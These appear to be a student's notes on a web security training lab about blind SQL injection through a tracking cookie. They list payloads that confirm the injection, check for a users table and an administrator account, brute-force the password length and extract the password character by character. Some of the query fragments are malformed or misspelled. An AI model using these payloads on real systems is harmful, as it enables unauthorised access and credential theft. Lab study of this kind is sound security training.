Lab 11
Vulnerable Parameter - Tracking Cookies

confirm the parameter is vulnerable to blind SQL Injection:

' AND '1'='1

receives a welcome back message!

select tracking id from tracking table where tracking id equals = #trackingid

(2) confirm that we have a users table
select tracking=id from tracking-table where trackingid='dfasdfagew' and (select 'x' from users LIMIT 1)='x'--'

x is an arbitrary value- what this query does: if there is a users table output x for each entry in the users table. If the users table has 5 users we should get 5 rows that have x in them. Destroys the query so limit it to one entry. Output the value x for each entry in the user's table. 

 outputs x for the first entry in the users table if it exists.
 
 3.) check to see if administrator is valid 
 
 AND (SELECT username FROM users WHERE username='administrator')='administrator
 
 4.) Enumerate the password of the administrator user
 
 find the length using the following query:
 'AND (SELECT 'x' FROM users WHERE username='administrator' AND LENGTH(password) > 1)='x
 
 after bruteforcing in intruder- I simply brutefofrced the length and found that it was greater than 19 but less than 21 so its 20
 'AND+(SELECT+'x'+FROM+users+WHERE+username%3d'administrator'+AND+LENGTH(password)+>+19)%3d'x; 
 
 
 5.) find each character in intruder
 
  AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
 
 



